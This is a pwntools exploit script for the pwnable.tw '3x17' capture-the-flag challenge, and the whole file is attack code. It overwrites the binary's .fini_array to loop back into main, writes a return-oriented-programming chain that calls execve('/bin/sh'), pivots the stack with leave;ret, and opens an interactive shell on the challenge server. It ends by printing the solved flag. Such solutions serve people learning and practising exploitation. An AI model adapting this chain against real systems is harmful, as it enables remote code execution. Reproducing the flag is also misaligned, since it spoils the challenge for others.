from pwn import *
import sys

if len(sys.argv) < 2:
	r = process("./3x17")
else:
	host, port = "chall.pwnable.tw", 10105
	r = remote(host, port)
raw_input("debug")

address = 0x4B40F0
address_binsh = address + 0x50
main = 0x401B6D
fini_array = 0x402960

rop_pop_rax = 0x41e4af
rop_pop_rdi = 0x401696
rop_pop_rsi = 0x406c30
rop_pop_rdx = 0x446e35
rop_syscall = 0x4022b4
rop_leave_ret = 0x401c4b


def _main(address, data):
	r.recvuntil("addr:")
	r.sendline(str(int(address)))
	r.recvuntil("data:")
	r.send(data)																	

payload1 = p64(fini_array) + p64(main) + "\n"
_main(address, payload1)

payload2 = p64(rop_pop_rdi) + p64(address_binsh) + p64(rop_pop_rsi)
_main(address + 0x18, payload2)

payload3 = p64(0x0) + p64(rop_pop_rdx) + p64(0x0)
_main(address + 0x18 * 2, payload3)

payload4 = p64(rop_syscall) + "/bin/sh\x00\n"
_main(address + 0x18 * 3, payload4)

payload5 = p64(rop_leave_ret) + p64(rop_pop_rax) + p64(0x3b)
_main(address, payload5)



r.interactive()
r.close()

# FLAG{Its_just_a_b4by_c4ll_0riented_Pr0gramm1ng_in_3xit}


